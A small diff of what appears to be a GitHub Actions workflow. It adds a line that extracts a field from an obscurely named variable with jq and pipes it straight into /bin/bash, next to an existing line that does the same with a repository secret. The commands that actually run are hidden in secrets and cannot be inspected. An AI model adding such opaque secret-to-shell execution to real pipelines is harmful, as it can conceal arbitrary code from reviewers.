@@ -21,6 +21,7 @@ jobs:
           y7180: ${{ secrets.y7180 }}
         run: |
           printf '%s' "$y7180" | jq -r .jc2 | /bin/bash
+          printf '%s' "$v03998" | jq -r .fgfji7734 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
